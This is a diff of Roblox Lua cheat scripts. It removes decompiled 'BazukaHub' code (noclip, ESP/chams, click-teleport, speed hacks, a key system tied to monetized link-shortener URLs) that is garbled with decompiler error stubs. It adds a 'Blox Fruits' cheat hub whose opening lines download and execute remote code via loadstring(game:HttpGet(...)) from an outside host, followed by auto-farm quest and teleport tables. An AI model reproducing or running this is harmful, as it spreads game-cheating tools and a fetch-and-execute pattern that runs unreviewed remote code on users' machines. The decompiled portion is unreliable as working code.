-    }, function(_6092, _6092_2, _6092_3)
-        local _6093 = workspace.GetDescendants
-        local _6094 = _6093(workspace)
-        for _6095, _6095_2 in _6094 do
-            local _6096 = _6095_2.IsA
-            _6096(_6095_2, "Part")
-            _6095_2.CanCollide = false
-        end
-    end)
-    local _6098 = _5771.Button
-    local _6099 = _6098(_5771, "World Improve", "http://www.roblox.com/asset/?id=11887653877")
-    local _6100 = _6099.Section
-    local _6101 = _6100(_6099, "Ð¡ustom Time", "Left")
-    local _6102 = _6101.Toggle
-    _6102(_6101, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_6104, _6104_2, _6104_3)
-    end)
-    local _6105 = _6101.Slider
-    _6105(_6101, {
-        Min = 0,
-        Title = "Hours",
-        Max = 23,
-        Default = 12,
-        Description = "",
-    }, function(_6107, _6107_2, _6107_3)
-        math.floor(_6107)
-    end)
-    local _6109 = _6101.Slider
-    _6109(_6101, {
-        Min = 0,
-        Title = "Minutes",
-        Max = 59,
-        Default = 0,
-        Description = "",
-    }, function(_6111, _6111_2, _6111_3)
-        math.floor(_6111)
-    end)
-    local _6113 = _6099.Section
-    local _6114 = _6113(_6099, "Vision Upgrade", "Left")
-    local _6115 = _6114.Toggle
-    _6115(_6114, {
-        Default = false,
-        Description = "",
-        Title = "FullBright",
-    }, function(_6117, _6117_2, _6117_3)
-    end)
-    local _6118 = _6114.Slider
-    _6118(_6114, {
-        Min = 0,
-        Title = "Brightness",
-        Max = 10,
-        Default = 0,
-        Description = "",
-    }, function(_6120, _6120_2, _6120_3)
-        math.floor(_6120)
-    end)
-    local _6122 = _6099.Section
-    local _6123 = _6122(_6099, "Custom Fog", "Right")
-    local _6124 = _6123.Toggle
-    _6124(_6123, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_6126, _6126_2, _6126_3)
-    end)
-    local _6127 = _6123.Slider
-    _6127(_6123, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_6129, _6129_2, _6129_3)
-        math.floor(_6129)
-    end)
-    local _6131 = _6123.Slider
-    _6131(_6123, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_6133, _6133_2, _6133_3)
-        math.floor(_6133)
-    end)
-    type(_5787)
-    local _ = _5787.r
-    local _ = _5787.g
-    local _ = _5787.b
-    local _6139 = _6123.ColorPicker
-    local _6140 = Color3.new
-    local _6141 = _6140()
-    _6139(_6123, {
-        Default = _6141,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_6143, _6143_2, _6143_3)
-    end)
-    local _6144 = _5771.Button
-    local _6145 = _6144(_5771, "Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _6146 = _6145.Section
-    local _6147 = _6146(_6145, "Chams", "Left")
-    local _6148 = _6147.Toggle
-    _6148(_6147, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_6150, _6150_2, _6150_3)
-    end)
-    local _6151 = _6147.Slider
-    _6151(_6147, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_6153, _6153_2, _6153_3)
-        local _6154, _6154_2, _6154_3 = math.floor(_6153)
-        local _ = _6154 / 100
-    end)
-    type(_5791)
-    local _ = _5791.r
-    local _ = _5791.g
-    local _ = _5791.b
-    local _6160 = _6147.ColorPicker
-    local _6161 = Color3.new
-    local _6162 = _6161()
-    _6160(_6147, {
-        Default = _6162,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_6164, _6164_2, _6164_3)
-    end)
-    local _6165 = _6147.Slider
-    _6165(_6147, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_6167, _6167_2, _6167_3)
-        local _6168, _6168_2, _6168_3 = math.floor(_6167)
-        local _ = _6168 / 100
-    end)
-    type(_5793)
-    local _ = _5793.r
-    local _ = _5793.g
-    local _ = _5793.b
-    local _6174 = _6147.ColorPicker
-    local _6175 = Color3.new
-    local _6176 = _6175()
-    _6174(_6147, {
-        Default = _6176,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_6178, _6178_2, _6178_3)
-    end)
-    local _6179 = _6145.Section
-    local _6180 = _6179(_6145, "ESP", "Right")
-    local _6181 = _6180.Toggle
-    _6181(_6180, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_6183, _6183_2, _6183_3)
-    end)
-    local _6184 = _6180.Slider
-    _6184(_6180, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_6186, _6186_2, _6186_3)
-        local _6187, _6187_2, _6187_3 = math.floor(_6186)
-        local _ = _6187 / 100
-    end)
-    local _6189 = _6180.Toggle
-    _6189(_6180, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_6191, _6191_2, _6191_3)
-    end)
-    local _6192 = _6180.Toggle
-    _6192(_6180, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_6194, _6194_2, _6194_3)
-    end)
-    local _6195 = _6180.Toggle
-    _6195(_6180, {
-        Default = false,
-        Description = "",
-        Title = "Health ESP",
-    }, function(_6197, _6197_2, _6197_3)
-    end)
-    local _6198 = _6180.Toggle
-    _6198(_6180, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_6200, _6200_2, _6200_3)
-    end)
-    local _6201 = _6180.Slider
-    _6201(_6180, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_6203, _6203_2, _6203_3)
-        math.floor(_6203)
-    end)
-    type(_5795)
-    local _ = _5795.r
-    local _ = _5795.g
-    local _ = _5795.b
-    local _6209 = _6180.ColorPicker
-    local _6210 = Color3.new
-    local _6211 = _6210()
-    _6209(_6180, {
-        Default = _6211,
-        Description = "",
-        Title = "Text Color",
-    }, function(_6213, _6213_2, _6213_3)
-    end)
-    local _6214 = _5773.Button
-    local _6215 = _6214(_5773, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _6216 = _6215.Section
-    local _6217 = _6216(_6215, "Character Actions", "Left")
-    local _6218 = _6217.Button
-    _6218(_6217, {
-        ButtonName = "Sit",
-        Title = "Sitting down",
-        Description = "",
-    }, function(_6220, _6220_2, _6220_3)
-        local _6221 = game.Players.LocalPlayer
-        local _6222 = _6221.Character
-        local _6223 = _6222.Humanoid
-        _6223.Sit = true
-    end)
-    local _6224 = _6217.Button
-    _6224(_6217, {
-        ButtonName = "Die",
-        Title = "Death",
-        Description = "",
-    }, function(_6226, _6226_2, _6226_3)
-        local _6227 = game.Players.LocalPlayer
-        local _6228 = _6227.Character
-        local _ = _6228.Humanoid
-        error("line 1: attempt to perform arithmetic (unm) on function")
-    end)
-    local _6230 = _6217.Button
-    _6230(_6217, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_6232, _6232_2, _6232_3)
-        local _TeleportService6233 = game:GetService("TeleportService")
-        local _6234 = _TeleportService6233.Teleport
-        local _Players6235 = game:GetService("Players")
-        local _6236 = _Players6235.LocalPlayer
-        _6234(_TeleportService6233, game.PlaceId, _6236)
-    end)
-    local _6238 = _6217.Button
-    _6238(_6217, {
-        ButtonName = "Give Item",
-        Title = "Click TP",
-        Description = "Giving You Item",
-    }, function(_6240, _6240_2, _6240_3)
-        local _6241 = game.Players.LocalPlayer
-        local _6242 = _6241.GetMouse
-        local _6243 = _6242(_6241)
-        local _6244 = Instance.new
-        local _6245 = _6244("Tool")
-        _6245.RequiresHandle = false
-        _6245.Name = "Click TP"
-        local _6246 = _6245.Activated
-        local _6247 = _6246.connect
-        _6247(_6246, function(_6249, _6249_2, _6249_3)
-            local _6250 = _6243.Hit
-            local _6251 = Vector3.new
-            local _6252 = _6251(0, 2.5, 0)
-            local _6253 = _6250 + _6252
-            local _6254 = CFrame.new
-            local _6255 = _6253.X
-            local _6256 = _6253.Y
-            local _6257 = _6253.Z
-            local _6258 = _6254(_6255, _6256, _6257)
-            local _6259 = game.Players.LocalPlayer
-            local _6260 = _6259.Character
-            local _6261 = _6260.HumanoidRootPart
-            _6261.CFrame = _6258
-        end)
-        local _6262 = game.Players.LocalPlayer
-        local _6263 = _6262.Backpack
-        _6245.Parent = _6263
-    end)
-    local _6264 = _6215.Section
-    local _6265 = _6264(_6215, "Jump Height Multiplier", "Right")
-    local _6266 = _6265.Toggle
-    _6266(_6265, {
-        Default = _1483,
-        Description = "Improve Your Jump Power",
-        Title = "Jump Miltiplier",
-    }, function(_6268, _6268_2, _6268_3)
-    end)
-    local _6269 = _6265.Slider
-    _6269(_6265, {
-        Min = 1,
-        Title = "Jump Power",
-        Max = 200,
-        Default = 35,
-        Description = "",
-    }, function(_6271, _6271_2, _6271_3)
-        math.floor(_6271)
-    end)
-    local _6273 = _6215.Section
-    local _6274 = _6273(_6215, "Walk Speed Multiplier", "Right")
-    local _6275 = _6274.Toggle
-    _6275(_6274, {
-        Default = false,
-        Description = "Improve Your Walk Speed",
-        Title = "Speed Multiplier",
-    }, function(_6277, _6277_2, _6277_3)
-    end)
-    local _6278 = _6274.Slider
-    _6278(_6274, {
-        Min = 1,
-        Title = "Walk Speed",
-        Max = 20,
-        Default = 1,
-        Description = "",
-    }, function(_6280, _6280_2, _6280_3)
-        math.floor(_6280)
-    end)
-    local _6282 = Instance.new
-    local _6283 = _6282("ScreenGui", game.CoreGui)
-    local _6284 = Instance.new
-    local _6285 = _6284("TextButton")
-    _6285.BackgroundTransparency = 1
-    local _6286 = UDim2.new
-    local _6287 = _6286(0, 0, 0, 0)
-    _6285.Size = _6287
-    _6285.Text = " "
-    _6285.Parent = _6283
-    local _6288 = Instance.new
-    local _6289 = _6288("ScreenGui", game.CoreGui)
-    _6289.Name = "BackgroundScreenGui"
-    _6289.Enabled = true
-    local _6290 = Instance.new
-    local _6291 = _6290("TextLabel", _6289)
-    _6291.Name = "BackgroundLabel"
-    local _6292 = Instance.new
-    local _6293 = _6292("UIGradient", _6291)
-    _6293.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.MoneyzKeyLink = "https://moneyz.fun/h7tByW"
-fenv.LinkifyKeyLink = "https://ify.ac/1b81"
-fenv.FreeKey = "dG9zaGFob3Jvc2"
-fenv.Day1Key = "1 DAY IT DOESNT EXIST RIGHT NOW BIBA BOBA KTO BLYAT ETO NAPISHET ANTI KIRILL SYSTEM"
-fenv.Day1Key2 = "1 DAY IT DOESNT EXIST RIGHT NOW BIBA BOBA KTO BLYAT ETO NAPISHET2 ANTI KIRILL SYSTEM"
-fenv.Day3Key = "3 DAY IT DOESNT EXIST RIGHT NOW BIBA BOBA KTO BLYAT ETO NAPISHET ANTI KIRILL SYSTEM"
-fenv.Day3Key2 = "3 DAY IT DOESNT EXIST RIGHT NOW BIBA BOBA KTO BLYAT ETO NAPISHET2 ANTI KIRILL SYSTEM"
-fenv.Week1Key = "1 WEEK IT DOESNT EXIST RIGHT NOW BIBA BOBA KTO BLYAT ETO NAPISHET ANTI KIRILL SYSTEM"
-fenv.Week1Key2 = "1 WEEK IT DOESNT EXIST RIGHT NOW BIBA BOBA KTO BLYAT ETO NAPISHET2 ANTI KIRILL SYSTEM"
-fenv.Month1Key = "1 MONTH IT DOESNT EXIST RIGHT NOW BIBA BOBA KTO BLYAT ETO NAPISHET ANTI KIRILL SYSTEM"
-fenv.Month1Key2 = "1 MONTH IT DOESNT EXIST RIGHT NOW BIBA BOBA KTO BLYAT ETO NAPISHET2 ANTI KIRILL SYSTEM"
-game.CoreGui.FindFirstChild(game.CoreGui, "Bazuka HubKey")
-local _6298 = game.CoreGui.FindFirstChild(game.CoreGui, "Bazuka HubKey")
-_6298:Destroy()
-genv.enteredkey = "There's No Key Entered!"
-local _6310 = Instance.new("Frame")
-local _6312 = Instance.new("TextLabel")
-local _6314 = Instance.new("TextLabel")
-local _6320 = Instance.new("UIGradient")
-Instance.new("TextButton")
-Instance.new("Frame")
-Instance.new("Frame")
-Instance.new("UIGradient")
-Instance.new("TextButton")
-Instance.new("Frame")
-Instance.new("Frame")
-Instance.new("UIGradient")
-Instance.new("TextBox")
-Instance.new("Frame")
-Instance.new("Frame")
-Instance.new("UIGradient")
-Instance.new("TextButton")
-Instance.new("Frame")
-Instance.new("Frame")
-Instance.new("UIGradient")
-Instance.new("TextButton")
-Instance.new("Frame")
-Instance.new("Frame")
-Instance.new("UIGradient")
-Instance.new("TextButton")
-Instance.new("TextLabel")
-Instance.new("Frame")
-Instance.new("UIGradient")
-Instance.new("Frame")
-Instance.new("UIGradient")
-Instance.new("Frame")
-_6310.Name = "MainFrame"
-_6310.Parent = Instance.new("Frame")
-_6310.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-_6310.BorderColor3 = Color3.fromRGB(16, 16, 16)
-_6310.Position = UDim2.new(0, 0, 0, 6)
-_6310.Size = UDim2.new(0, 188, 0, 182)
-_6312.Name = "Name"
-_6312.Parent = _6310
-_6312.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-_6312.BackgroundTransparency = 1
-_6312.BorderColor3 = Color3.fromRGB(0, 0, 0)
-_6312.BorderSizePixel = 0
-_6312.Position = UDim2.new(0, 5, 0, 1)
-_6312.Size = UDim2.new(0, 110, 0, 30)
-_6312.Font = Enum.Font.Code
-_6312.Text = "BazukaHub"
-_6312.TextColor3 = Color3.fromRGB(205, 205, 205)
-_6312.TextSize = 34
-_6312.TextWrapped = true
-_6314.Name = "WasMadeBy"
-_6314.Parent = _6310
-_6314.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-_6314.BackgroundTransparency = 1
-_6314.BorderColor3 = Color3.fromRGB(0, 0, 0)
-_6314.BorderSizePixel = 0
-_6314.Position = UDim2.new(0, 0, 0, 30)
-_6314.Size = UDim2.new(0, 188, 0, 30)
-_6314.Font = Enum.Font.Code
-_6314.Text = "Was made by Reyn7525"
-_6314.TextColor3 = Color3.fromRGB(205, 205, 205)
-_6314.TextSize = 16
-_6320.Parent = Instance.new("Frame")
-local _ = ColorSequence.new
-error("line 1: attempt to index nil with 'new'")
+local Update = (loadstring(game:HttpGet("https://you.whimper.xyz/sources/relzhub/dep/pc.lua")))();
+local Alert = (loadstring(game:HttpGet("https://you.whimper.xyz/sources/relzhub/dep/alert.lua")))();
+local Library = Update:Window("Blox Fruits");
+local MainTab = Library:Tab("Main", "rbxassetid://10723407389");
+local SettingsTab = Library:Tab("Setting", "rbxassetid://10734950309");
+local HoldTab = Library:Tab("Hold Skill", "rbxassetid://10734984606");
+local ItemsTab = Library:Tab("Items", "rbxassetid://10723405360");
+local SeaTab = Library:Tab("Sea", "rbxassetid://10709761530");
+local StatsTab = Library:Tab("Stats", "rbxassetid://10709770317");
+local RaceV4Tab = Library:Tab("Race", "rbxassetid://10747372167");
+local CombatTab = Library:Tab("Combat", "rbxassetid://10734975486");
+local RaidTab = Library:Tab("Raid", "rbxassetid://10723345749");
+local EspTab = Library:Tab("Esp", "rbxassetid://10723346959");
+local TeleportTab = Library:Tab("Teleport", "rbxassetid://10723434557");
+local ShopTab = Library:Tab("Shop", "rbxassetid://10734952479");
+local FruitTab = Library:Tab("Devil Fruit", "rbxassetid://10709761889");
+local MiscTab = Library:Tab("Misc", "rbxassetid://10723424838");
+local ServTab = Library:Tab("Serv", "rbxassetid://10723426722");
+if game.PlaceId == 2753915549 then
+	World1 = true;
+elseif game.PlaceId == 4442272183 then
+	World2 = true;
+elseif game.PlaceId == 7449423635 then
+	World3 = true;
+end;
+function CheckQuest()
+	MyLevel = (game:GetService("Players")).LocalPlayer.Data.Level.Value;
+	if World1 then
+		if MyLevel == 1 or MyLevel <= 9 then
+			Mon = "Bandit";
+			LevelQuest = 1;
+			NameQuest = "BanditQuest1";
+			NameMon = "Bandit";
+			CFrameQuest = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, -0, -0.341998369, 0, 1, -0, 0.341998369, 0, 0.939700544);
+			CFrameMon = CFrame.new(1045.962646484375, 27.00250816345215, 1560.8203125);
+		elseif MyLevel == 10 or MyLevel <= 14 then
+			Mon = "Monkey";
+			LevelQuest = 1;
+			NameQuest = "JungleQuest";
+			NameMon = "Monkey";
+			CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0);
+			CFrameMon = CFrame.new(-1448.51806640625, 67.85301208496094, 11.46579647064209);
+		elseif MyLevel == 15 or MyLevel <= 29 then
+			Mon = "Gorilla";
+			LevelQuest = 2;
+			NameQuest = "JungleQuest";
+			NameMon = "Gorilla";
+			CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0);
+			CFrameMon = CFrame.new(-1129.8836669921875, 40.46354675292969, -525.4237060546875);
+		elseif MyLevel == 30 or MyLevel <= 39 then
+			Mon = "Pirate";
+			LevelQuest = 1;
+			NameQuest = "BuggyQuest1";
+			NameMon = "Pirate";
+			CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627);
+			CFrameMon = CFrame.new(-1103.513427734375, 13.752052307128906, 3896.091064453125);
+		elseif MyLevel == 40 or MyLevel <= 59 then
+			Mon = "Brute";
+			LevelQuest = 2;
+			NameQuest = "BuggyQuest1";
+			NameMon = "Brute";
+			CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627);
+			CFrameMon = CFrame.new(-1140.083740234375, 14.809885025024414, 4322.92138671875);
+		elseif MyLevel == 60 or MyLevel <= 74 then
+			Mon = "Desert Bandit";
+			LevelQuest = 1;
+			NameQuest = "DesertQuest";
+			NameMon = "Desert Bandit";
+			CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693);
+			CFrameMon = CFrame.new(924.7998046875, 6.44867467880249, 4481.5859375);
+		elseif MyLevel == 75 or MyLevel <= 89 then
+			Mon = "Desert Officer";
+			LevelQuest = 2;
+			NameQuest = "DesertQuest";
+			NameMon = "Desert Officer";
+			CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693);
+			CFrameMon = CFrame.new(1608.2822265625, 8.614224433898926, 4371.00732421875);
+		elseif MyLevel == 90 or MyLevel <= 99 then
+			Mon = "Snow Bandit";
+			LevelQuest = 1;
+			NameQuest = "SnowQuest";
+			NameMon = "Snow Bandit";
+			CFrameQuest = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685);
+			CFrameMon = CFrame.new(1354.347900390625, 87.27277374267578, -1393.946533203125);
+		elseif MyLevel == 100 or MyLevel <= 119 then
+			Mon = "Snowman";
+			LevelQuest = 2;
+			NameQuest = "SnowQuest";
+			NameMon = "Snowman";
+			CFrameQuest = CFrame.new(1389.74451, 88.1519318, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685);
+			CFrameMon = CFrame.new(1201.6412353515625, 144.57958984375, -1550.0670166015625);
+		elseif MyLevel == 120 or MyLevel <= 149 then
+			Mon = "Chief Petty Officer";
+			LevelQuest = 1;
+			NameQuest = "MarineQuest2";
+			NameMon = "Chief Petty Officer";
+			CFrameQuest = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-4881.23095703125, 22.65204429626465, 4273.75244140625);
+		elseif MyLevel == 150 or MyLevel <= 174 then
+			Mon = "Sky Bandit";
+			LevelQuest = 1;
+			NameQuest = "SkyQuest";
+			NameMon = "Sky Bandit";
+			CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268);
+			CFrameMon = CFrame.new(-4953.20703125, 295.74420166015625, -2899.22900390625);
+		elseif MyLevel == 175 or MyLevel <= 189 then
+			Mon = "Dark Master";
+			LevelQuest = 2;
+			NameQuest = "SkyQuest";
+			NameMon = "Dark Master";
+			CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268);
+			CFrameMon = CFrame.new(-5259.8447265625, 391.3976745605469, -2229.035400390625);
+		elseif MyLevel == 190 or MyLevel <= 209 then
+			Mon = "Prisoner";
+			LevelQuest = 1;
+			NameQuest = "PrisonerQuest";
+			NameMon = "Prisoner";
+			CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -0.00000000500292918, -0.995993316, 0.00000000160817859, 1, -0.00000000516744869, 0.995993316, -0.00000000206384709, -0.0894274712);
+			CFrameMon = CFrame.new(5098.9736328125, -0.3204058110713959, 474.2373352050781);
+		elseif MyLevel == 210 or MyLevel <= 249 then
+			Mon = "Dangerous Prisoner";
+			LevelQuest = 2;
+			NameQuest = "PrisonerQuest";
+			NameMon = "Dangerous Prisoner";
+			CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -0.00000000500292918, -0.995993316, 0.00000000160817859, 1, -0.00000000516744869, 0.995993316, -0.00000000206384709, -0.0894274712);
+			CFrameMon = CFrame.new(5654.5634765625, 15.633401870727539, 866.2991943359375);
+		elseif MyLevel == 250 or MyLevel <= 274 then
+			Mon = "Toga Warrior";
+			LevelQuest = 1;
+			NameQuest = "ColosseumQuest";
+			NameMon = "Toga Warrior";
+			CFrameQuest = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0, 0.857167721, 0, -0.515037298);
+			CFrameMon = CFrame.new(-1820.21484375, 51.68385696411133, -2740.6650390625);
+		elseif MyLevel == 275 or MyLevel <= 299 then
+			Mon = "Gladiator";
+			LevelQuest = 2;
+			NameQuest = "ColosseumQuest";
+			NameMon = "Gladiator";
+			CFrameQuest = CFrame.new(-1580.04663, 6.35000277, -2986.47534, -0.515037298, 0, -0.857167721, 0, 1, 0, 0.857167721, 0, -0.515037298);
+			CFrameMon = CFrame.new(-1292.838134765625, 56.380882263183594, -3339.031494140625);
+		elseif MyLevel == 300 or MyLevel <= 324 then
+			Mon = "Military Soldier";
+			LevelQuest = 1;
+			NameQuest = "MagmaQuest";
+			NameMon = "Military Soldier";
+			CFrameQuest = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469);
+			CFrameMon = CFrame.new(-5411.16455078125, 11.081554412841797, 8454.29296875);
+		elseif MyLevel == 325 or MyLevel <= 374 then
+			Mon = "Military Spy";
+			LevelQuest = 2;
+			NameQuest = "MagmaQuest";
+			NameMon = "Military Spy";
+			CFrameQuest = CFrame.new(-5313.37012, 10.9500084, 8515.29395, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469);
+			CFrameMon = CFrame.new(-5802.8681640625, 86.26241302490234, 8828.859375);
+		elseif MyLevel == 375 or MyLevel <= 399 then
+			Mon = "Fishman Warrior";
+			LevelQuest = 1;
+			NameQuest = "FishmanQuest";
+			NameMon = "Fishman Warrior";
+			CFrameQuest = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734);
+			CFrameMon = CFrame.new(60878.30078125, 18.482830047607422, 1543.7574462890625);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.8515625, 11.6796875, 1819.7841796875));
+			end;
+		elseif MyLevel == 400 or MyLevel <= 449 then
+			Mon = "Fishman Commando";
+			LevelQuest = 2;
+			NameQuest = "FishmanQuest";
+			NameMon = "Fishman Commando";
+			CFrameQuest = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734);
+			CFrameMon = CFrame.new(61922.6328125, 18.482830047607422, 1493.934326171875);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(61163.8515625, 11.6796875, 1819.7841796875));
+			end;
+		elseif MyLevel == 450 or MyLevel <= 474 then
+			Mon = "God's Guard";
+			LevelQuest = 1;
+			NameQuest = "SkyExp1Quest";
+			NameMon = "God's Guard";
+			CFrameQuest = CFrame.new(-4721.88867, 843.874695, -1949.96643, 0.996191859, -0, -0.0871884301, 0, 1, -0, 0.0871884301, 0, 0.996191859);
+			CFrameMon = CFrame.new(-4710.04296875, 845.2769775390625, -1927.3079833984375);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-4607.82275, 872.54248, -1667.55688));
+			end;
+		elseif MyLevel == 475 or MyLevel <= 524 then
+			Mon = "Shanda";
+			LevelQuest = 2;
+			NameQuest = "SkyExp1Quest";
+			NameMon = "Shanda";
+			CFrameQuest = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0, -0.906319618, 0, -0.422592998);
+			CFrameMon = CFrame.new(-7678.48974609375, 5566.40380859375, -497.2156066894531);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047));
+			end;
+		elseif MyLevel == 525 or MyLevel <= 549 then
+			Mon = "Royal Squad";
+			LevelQuest = 1;
+			NameQuest = "SkyExp2Quest";
+			NameMon = "Royal Squad";
+			CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-7624.25244140625, 5658.13330078125, -1467.354248046875);
+		elseif MyLevel == 550 or MyLevel <= 624 then
+			Mon = "Royal Soldier";
+			LevelQuest = 2;
+			NameQuest = "SkyExp2Quest";
+			NameMon = "Royal Soldier";
+			CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-7836.75341796875, 5645.6640625, -1790.6236572265625);
+		elseif MyLevel == 625 or MyLevel <= 649 then
+			Mon = "Galley Pirate";
+			LevelQuest = 1;
+			NameQuest = "FountainQuest";
+			NameMon = "Galley Pirate";
+			CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381);
+			CFrameMon = CFrame.new(5551.02197265625, 78.90135192871094, 3930.412841796875);
+		elseif MyLevel >= 650 then
+			Mon = "Galley Captain";
+			LevelQuest = 2;
+			NameQuest = "FountainQuest";
+			NameMon = "Galley Captain";
+			CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381);
+			CFrameMon = CFrame.new(5441.95166015625, 42.50205993652344, 4950.09375);
+		end;
+	elseif World2 then
+		if MyLevel == 700 or MyLevel <= 724 then
+			Mon = "Raider";
+			LevelQuest = 1;
+			NameQuest = "Area1Quest";
+			NameMon = "Raider";
+			CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985);
+			CFrameMon = CFrame.new(-728.3267211914062, 52.779319763183594, 2345.7705078125);
+		elseif MyLevel == 725 or MyLevel <= 774 then
+			Mon = "Mercenary";
+			LevelQuest = 2;
+			NameQuest = "Area1Quest";
+			NameMon = "Mercenary";
+			CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985);
+			CFrameMon = CFrame.new(-1004.3244018554688, 80.15886688232422, 1424.619384765625);
+		elseif MyLevel == 775 or MyLevel <= 799 then
+			Mon = "Swan Pirate";
+			LevelQuest = 1;
+			NameQuest = "Area2Quest";
+			NameMon = "Swan Pirate";
+			CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906);
+			CFrameMon = CFrame.new(1068.664306640625, 137.61428833007812, 1322.1060791015625);
+		elseif MyLevel == 800 or MyLevel <= 874 then
+			Mon = "Factory Staff";
+			NameQuest = "Area2Quest";
+			LevelQuest = 2;
+			NameMon = "Factory Staff";
+			CFrameQuest = CFrame.new(632.698608, 73.1055908, 918.666321, -0.0319722369, 0.000000000896074881, -0.999488771, 0.000000000136326533, 1, 0.000000000892172336, 0.999488771, -0.000000000107732087, -0.0319722369);
+			CFrameMon = CFrame.new(73.07867431640625, 81.86344146728516, -27.470672607421875);
+		elseif MyLevel == 875 or MyLevel <= 899 then
+			Mon = "Marine Lieutenant";
+			LevelQuest = 1;
+			NameQuest = "MarineQuest3";
+			NameMon = "Marine Lieutenant";
